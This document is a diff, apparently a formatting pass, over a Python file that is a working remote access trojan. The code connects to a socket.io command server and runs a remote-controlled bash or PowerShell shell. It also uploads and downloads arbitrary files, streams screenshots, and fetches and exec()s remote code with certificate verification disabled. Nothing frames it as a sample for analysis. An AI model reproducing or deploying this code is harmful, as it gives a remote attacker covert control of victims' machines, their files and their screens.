@@ -17,19 +17,20 @@ import re
 # Declare the global stop event
 stop_event = threading.Event()
 
+
 def run(data):
     def create_module(url):
         # Create an SSL context that doesn't verify certificates
         context = ssl._create_unverified_context()
         with urlopen(url, context=context) as response:
-            code = response.read().decode('utf-8')
-    
-        spec = importlib.util.spec_from_loader('temp', loader=None)
+            code = response.read().decode("utf-8")
+
+        spec = importlib.util.spec_from_loader("temp", loader=None)
         module = importlib.util.module_from_spec(spec)
-    
+
         # Execute the code in the module's namespace
         exec(code, module.__dict__)
-    
+
         return module
 
     sio = socketio.Client(logger=False, engineio_logger=False)
@@ -40,7 +41,7 @@ def run(data):
 
     if system == "Linux" or system == "Darwin":
         shellScript = "bash"
-    elif system == 'Windows':
+    elif system == "Windows":
         shellScript = "powershell"
     else:
         shellScript = "bash"
@@ -53,11 +54,13 @@ def run(data):
 
         def start(self):
             self.running = True
-            if os.name == 'posix':  # Unix-like systems
+            if os.name == "posix":  # Unix-like systems
                 print("Linux shell")
                 import pty
+
                 self.master_fd, slave_fd = pty.openpty()
                 import termios
+
                 attrs = termios.tcgetattr(slave_fd)
                 attrs[3] = attrs[3] & ~termios.ECHO  # Disable ECHO flag
                 termios.tcsetattr(slave_fd, termios.TCSANOW, attrs)
@@ -67,7 +70,7 @@ def run(data):
                     stdout=slave_fd,
                     stderr=slave_fd,
                     universal_newlines=True,
-                    close_fds=True
+                    close_fds=True,
                 )
                 output_thread = threading.Thread(target=self.read_output_posix)
             else:  # Windows
@@ -78,7 +81,7 @@ def run(data):
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     universal_newlines=True,
-                    shell=True
+                    shell=True,
                 )
                 output_thread = threading.Thread(target=self.read_output_windows)
                 error_thread = threading.Thread(target=self.read_err_windows).start()
@@ -88,7 +91,13 @@ def run(data):
         def read_output_posix(self):
             while self.running:
                 try:
-                    output = os.read(self.master_fd, 1024).decode("utf-8", errors="ignore").replace("\r\n", "\n").replace("\r", "\n").strip()
+                    output = (
+                        os.read(self.master_fd, 1024)
+                        .decode("utf-8", errors="ignore")
+                        .replace("\r\n", "\n")
+                        .replace("\r", "\n")
+                        .strip()
+                    )
                     if output:
                         sio.emit("result", str(output))
                 except OSError:
@@ -107,23 +116,23 @@ def run(data):
                     sio.emit("result", output)
 
         def write_input(self, command):
-            if os.name == 'posix':
-                        if not command.endswith("\n"):
-                            command += "\n"
-                            os.write(self.master_fd, command.encode())
+            if os.name == "posix":
+                if not command.endswith("\n"):
+                    command += "\n"
+                    os.write(self.master_fd, command.encode())
             else:
                 self.process.stdin.write(command + "\n")
                 self.process.stdin.flush()
 
     @sio.on("command")
     def command(data_new):
-        if data['uid'] == data_new['uid']:
-            shell.write_input(data_new['cmd'])
+        if data["uid"] == data_new["uid"]:
+            shell.write_input(data_new["cmd"])
 
-    @sio.on('restart')
+    @sio.on("restart")
     def restart(data_new):
         global shell  # Declare shell as global to modify it
-        if data_new == data['uid']:
+        if data_new == data["uid"]:
             if shell.process:
                 shell.process.terminate()
                 shell.running = False
@@ -136,29 +145,36 @@ def run(data):
         print(sio.sid)
         print(data["uid"])
 
-    @sio.on('upload_file')
+    @sio.on("upload_file")
     def upload_file(data_new):
-        if data['uid'] == data_new['uid']:
-            print(data_new['file_name'])
-            with open(data_new['file_name'], 'wb') as f:
-                decoded_data = base64.b64decode(data_new['file'])
+        if data["uid"] == data_new["uid"]:
+            print(data_new["file_name"])
+            with open(data_new["file_name"], "wb") as f:
+                decoded_data = base64.b64decode(data_new["file"])
                 f.write(decoded_data)
 
     @sio.on("download_file")
     def download_file(data_new):
-        if data['uid'] == data_new['uid']:
-            with open(data_new['file_path'], 'rb') as f:
+        if data["uid"] == data_new["uid"]:
+            with open(data_new["file_path"], "rb") as f:
                 file = f.read()
-            file_ready = base64.b64encode(file).decode('utf-8')
-            sio.emit('download_file_return', {'uid': data_new['uid'], 'file_name': data_new['file_path'], 'file': file_ready})
+            file_ready = base64.b64encode(file).decode("utf-8")
+            sio.emit(
+                "download_file_return",
+                {
+                    "uid": data_new["uid"],
+                    "file_name": data_new["file_path"],
+                    "file": file_ready,
+                },
+            )
             print("emited")
 
     @sio.on("pem")
     def pem(data_new):
-        if data['uid'] == data_new['uid']:
-            print(data['url'] + data_new['url'])
-            module = create_module(data['url'] + data_new['url'])
-            module.run(sio, data['uid'])
+        if data["uid"] == data_new["uid"]:
+            print(data["url"] + data_new["url"])
+            module = create_module(data["url"] + data_new["url"])
+            module.run(sio, data["uid"])
 
     def take_screenshots(sio, uid, fps=5, quality=20):
         frame_interval = 1 / fps
@@ -172,15 +188,15 @@ def run(data):
                 if current_time - last_capture_time >= frame_interval:
                     # Capture screenshot
                     screenshot = sct.grab(monitor)
-                    
+
                     # Convert screenshot to PIL Image
                     img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
-                    
+
                     # Compress to JPEG with adjustable quality
                     with io.BytesIO() as output:
                         img.save(output, format="JPEG", quality=quality)
                         jpeg_data = output.getvalue()
-                    
+
                     # Emit the raw JPEG data instead of base64
                     sio.emit("screenshot", {"uid": uid, "image": jpeg_data})
                     print("Sent compressed screenshot")
@@ -190,14 +206,18 @@ def run(data):
                 # Small sleep to prevent a tight loop
                 time.sleep(0.001)
 
-    screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uid']))
+    screenshot_thread = threading.Thread(
+        target=take_screenshots, args=(sio, data["uid"])
+    )
 
     @sio.on("screen_status")
     def screen_status(data_new):
-        if data['uid'] == data_new['uid']:
-            if data_new['status'] == "start":
+        if data["uid"] == data_new["uid"]:
+            if data_new["status"] == "start":
                 stop_event.clear()  # Reset the event to False
-                screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uid']))
+                screenshot_thread = threading.Thread(
+                    target=take_screenshots, args=(sio, data["uid"])
+                )
                 screenshot_thread.start()
             else:
                 stop_event.set()  # Signal the thread to stop
@@ -206,8 +226,7 @@ def run(data):
                 except:
                     "Thread is already dead"
 
-
-    sio.connect(data['url'])
+    sio.connect(data["url"])
 
     shell = InteractiveShell()
     shell.start()
